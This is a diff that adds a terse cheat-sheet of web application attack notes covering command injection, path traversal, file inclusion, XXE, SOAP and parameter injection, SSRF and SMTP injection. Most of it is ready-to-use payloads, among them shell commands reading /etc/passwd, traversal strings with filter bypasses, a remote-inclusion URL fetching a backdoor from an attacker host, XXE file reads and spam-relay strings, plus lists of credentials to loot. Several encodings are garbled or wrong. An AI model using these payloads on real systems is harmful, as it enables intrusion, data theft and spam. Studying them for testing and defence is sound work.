@@ -1,0 +1,172 @@
+[ back-end components ]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[RCE]
+[*] xamples directly via Perl, via ASP :
+pipe |, and &&, or ||, ;, `command` common metacharacters
+
+[###] via Dynamic Execution (PHP,Perl eval() or ASP Execute()):
+;system("cat /etc/passwd")
+;echo file_get_contents('/etc/passwd')
+
+[###] finding:
+causing delays the easiest way:
+||ping -i 30 localhost; x||ping -n 30 localhost & 
+`ping localhost`
+%0a ping -i 30 localhost %0a
+...
+out-of-band channels. TFTP to copy tools up to the server. netcat or telnet. mail...
+
+<> can redirect the output of a command to a file
+nslookup [script] > /executable/folder/
+**server can't find [script]: NXDOMAIN
+the markup within the injected script is executed.
+$IFS in Unix-based is a white space. Useful in filters.
+
+phpinfo() retrive conf details of the PHP environment
+
+[###] prevention: block metacharacters and whitelists
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ file path,LFI,RFI ]
+[###] path traversal vulns:
+strace/ltrace are used to monitor filesystem activities
+forward and backward slashes in Windows, only backward for UNIX  (backend system called)
+redundant traversal sequences are tolerated
+>> ../../../../../../../../../windows/win.ini (readable for everyone files)
+>> ../../../../../../../../../tmp
+>> ../../../../../../../../../../../../windows/system32/config/sam (noone readable)
+to test if it is being processed in the response.
+test: filename=foo/bar/../file.txt (even if bar does not exist)
+
+[*] simple circumvention:
+(1) encode :
+      [+++] both slashes [+++]
+>>> url-encode:dot %2e, / %2f, \ %5c
+>>> 16-bit Unicode encoding: dot %u0023, / %u2215, \ %u2216
+>>> Double URL encoding: dot %252e, %252f, %252f
+>>> Overlong UTF-8 Unicode encoding: example: dot %c0%2e, %e040%ae, %c0ae
+
+(2) if the filter is not applied recursively: ....//, ....\/, ..../\, ....\\
+(3) if filetype permitted is only jpg: ../../../../boot.ini%00.jpg
+applications may permit strings containing null bytes but fs will truncate.
+../../../boot.ini%00 if .jpg is being added
+(4) filename starts with dir: dir/../../../etc/passwd
+(5) sometimes is useful to be redundant for obfuscation/hashing schemes 3 to 4bytes(base64 scheme): ./
+
+[*] loot: password files, configuration files, include files db creds, data sources(db and xml), source code server-executable pages in search of bugs, log files(users and tokens)
+write access: write to startup folders, in.ftpd and the likewise for next connections, write scripts and call them.
+[*] prevention: chrooted filesystems, logical volumes mounted, java.io.File object and System.Io.Path.GetFullPath in ASP.NET
+
+[###] file inclusion vulns:
+Include files in scripting languages are put in the invoker as it was originally there and executed. PHP is specially sensible:
+RFI >>> https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor
+LFI >>> server-executable files that have sensitive info, effects or pull static resources that are typically displayed in the response.
+[*] finding: in languages and locations...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ xml interpreters injection ]
+between browser and front-end application server
+between back-end application components like soap
+
+[****] xml external entity (XXE) injection. 
+<!DOCTYPE foo [ <!ENTITY testref â€œtestrefvalueâ€ > ]>
+
+[****] (in the local fs)
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM â€œfile:///windows/win.iniâ€ > ]>
+<Search><SearchTerm>&xxe;</SearchTerm></Search>
+
+[****] (in the network)
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM â€œhttp://192.168.1.1:25â€ > ]>
+<Search><SearchTerm>&xxe;</SearchTerm></Search>
+
+[###] vectors:
+[*] proxy for retrieving info from internal servers
+[*] exploit back-end components
+[*] test open ports internal network
+[*] cause denial of service: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM â€œ file:///dev/randomâ€> ]>
+
+[###] soap (simple object access protocol) services:
+[*] simple injection if it takes the first entry:
+FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
+</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit
+[*] using a comment to erase an element:
+FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
+</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit
+
+[###] commenting the rest of the xml is not useful if it is not closed: <!--
+[*]detection:
+rogue tags...
+<foo></foo> es igual a <foo/> en la respuesta comprobar.
+iniciar comentarios en un parametro y terminarlos en otros, invertir.
+
+[*] prevention:
+HTML-encode any XML metacharacters (<,>,/) that appears in user input. Replacing each literal character with their corresponding HTML entities.
+< &lt, > &gt, / &#47
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ back-end http requests ]
+
+[###] server-side http redirection: resource or URL requested by the front-end application server.
+loc=192.168.0.1:22 access an internal ssh server and displays the banner, http proxy.
+XSS if it is used to display attacker-controlled content within its responses.
+
+[*] identify:
+(1) parameters passing hostnames,ips or full urls
+(2) alt resource
+(3) point to some server you can monitor
+(4) timing may mean network restrictions(FW)
+
+[*] attacks:
+(5) BURP INTRUDER to connect to a range of IP addresses and ports in sequeneces, port-scan the internal network
+(6) use the loopback to retrieve sensitive content
+(7) try XSS
+
+[###] http parameter injection (HPI): override values sent by the server
+
+FromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3dtru
+e&Submit=Submit
+
+HPP(http parameter polution). The value read depends on the back-end HTTP server, can be: last or first appearance, concatenate or array values.
+
+[*] Attacks against URL translation: (mod_rewrite rules in Apache)
+RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[^\&]*\ HTTP/
+RewriteRule ^pub/user/([^/\.]+)$ /inc/user_mgr.php?mode=view&name=$1
+
+/pub/user/fran >>> /inc/user_mgr.php?mode=view&name=fran
+can be polluted by: /pub/user/fran%26mode=edit, translated into: /inc/user_mgr.php?mode=view&name=fran&mode=edit (PHP takes the last for example)
+
+[*] tests
+(1) possible injection encodings:
+%26foo%3dbar, %3bfoo%3dbar, %2526foo%253dbar
+(2) try to override known parameters
+(3) try override front-end validation if possible
+(4) also cookies and body
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ mail services ]
+SMTP command injection into the conversation between the front-end and the mail server.
+spammers...
+
+[###] E-mail Header Manipulation: php mail() command
+example To input in a form:
+fran@webmail.com%0aBcc:cualquiera@webmail.com%0aCcc:cualquiera2@webmail.com
+Translates to:
+    To: fran@webmail.com
+    From: none@webmail.com
+    Bcc: cualquiera@..
+    Ccc: cualquiera2@..
+    Subject...
+    ...
+[###] SMTP command injection
+From:daf@mail.com&&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+mail@wahh.com%0d%0aRCPT+TO:+john@wahh-mail.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@mail.com%0d%0aSubject:+Cheap%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo
+[*] prevention: reject new lines characters and single dot disallowed.
+
